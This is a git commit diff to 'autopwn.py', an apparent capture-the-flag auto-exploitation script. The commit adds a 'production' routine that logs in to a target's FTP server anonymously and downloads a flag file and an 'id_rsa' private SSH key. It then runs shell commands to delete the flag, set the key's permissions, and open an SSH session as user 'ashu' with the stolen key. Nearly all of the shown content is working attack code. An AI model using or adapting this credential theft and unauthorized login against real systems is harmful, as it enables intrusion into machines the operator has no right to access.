30e792bdaaf21bbfefa9c1ce76d1c1cbf93ba038
Uugana <65070195+uug4na@users.noreply.github.com>
2022-07-20 15:21:42 +0800

    added production

--- autopwn.py
+++ autopwn.py
@@ -1,5 +1,6 @@
 import requests
 import os
+import ftplib
 
 machineName = input("Enter Machine Name: ")
 sess = requests.session()
@@ -35,10 +36,28 @@ def Tyler():
     except:
         print("[!] Connection Failed")
 
+def production():
+    ip = input("Enter Machine Ip: ")
+    username = "anonymous"
+    password = "anonymous"
+    filenames = [
+            "flag.txt",
+            "id_rsa"
+    ]
+    ftp_server = ftplib.FTP(ip, username, password)
+    ftp_server.encoding = 'utf-8'
+    for filenames in filenames:
+        with open(filenames, "wb") as f:
+            ftp_server.retrbinary(f"RETR {filenames}", f.write)
+        file = open("flag.txt", "r")
+    print("first flag: " + file.read())
+    os.system("rm -r 'flag.txt'; chmod 600 id_rsa")
+    os.system("ssh -i id_rsa -p 22 ashu@" + ip)
+    ftp_server.quit()
+
+
 if __name__ == "__main__":
     if machineName == "Tyler" or machineName == "tyler":
         Tyler()
-    else:
-        print("[!] Machine Not Found")
-        exit()
-        
+    if machineName == "Production" or machineName == "production":
+        production()
